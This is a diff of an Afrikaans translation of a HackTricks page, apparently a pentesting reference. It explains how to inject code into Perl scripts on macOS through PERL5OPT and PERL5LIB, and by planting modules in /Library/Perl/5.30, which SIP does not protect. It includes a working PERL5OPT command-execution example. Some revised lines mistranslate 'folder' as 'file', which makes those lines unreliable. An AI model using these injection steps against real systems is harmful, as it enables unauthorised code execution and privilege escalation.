@@ -1,4 +1,4 @@
-# macOS Perl Aansoekinspuiting
+# macOS Perl-toepassingsinspuiting
 
 <details>
 
@@ -6,9 +6,9 @@
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
@@ -26,7 +26,7 @@ print "Hello from the Perl script!\n";
 ```
 {% endcode %}
 
-Voer nou die **omgewingsveranderlike uit** en voer die **perl** skrip uit:
+Voer nou die **omgewingsveranderlike uit** en voer die **perl** skrips uit:
 ```bash
 export PERL5OPT='-Mwarnings;system("whoami")'
 perl test.pl # This will execute "whoami"
@@ -48,7 +48,7 @@ PERL5LIB=/tmp/ PERL5OPT=-Mpmod
 ```
 ## Via afhanklikhede
 
-Dit is moontlik om die afhanklikhede van die Perl wat loop te lys:
+Dit is moontlik om die afhanklikhede van die Perl wat loop, in die volgorde van die lêer te lys:
 ```bash
 perl -e 'print join("\n", @INC)'
 ```
@@ -64,13 +64,13 @@ Wat sal iets soos die volgende teruggee:
 /System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
 /System/Library/Perl/Extras/5.30
 ```
-Sommige van die teruggekeerde folders bestaan selfs nie, maar **`/Library/Perl/5.30`** bestaan wel, dit is **nie beskerm** deur **SIP** en dit is **voor** die folders wat **beskerm word deur SIP**. Daarom kan iemand daardie folder misbruik om skrips afhanklikhede daarin by te voeg sodat 'n hoë-privilege Perl-skrip dit kan laai.
+Sommige van die teruggekeerde lêers bestaan selfs nie, maar **`/Library/Perl/5.30`** bestaan wel, dit is **nie beskerm** deur **SIP** en dit is **voor** die lêers wat **beskerm word deur SIP**. Daarom kan iemand daardie lêer misbruik om skrips afhanklikhede daarin by te voeg sodat 'n hoë-geprivilegeerde Perl-skrip dit kan laai.
 
 {% hint style="warning" %}
-Let wel dat jy **root moet wees om in daardie folder te skryf** en deesdae sal jy hierdie **TCC-prompt** kry:
+Let wel dat jy **root moet wees om in daardie lêer te skryf** en deesdae sal jy hierdie **TCC-prompt** kry:
 {% endhint %}
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (25).png" alt="" width="244"><figcaption></figcaption></figure>
 
 Byvoorbeeld, as 'n skrip **`use File::Basename;`** invoer, sou dit moontlik wees om `/Library/Perl/5.30/File/Basename.pm` te skep om dit arbitêre kode te laat uitvoer.
 
@@ -86,7 +86,7 @@ Ander maniere om HackTricks te ondersteun:
 
 * As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
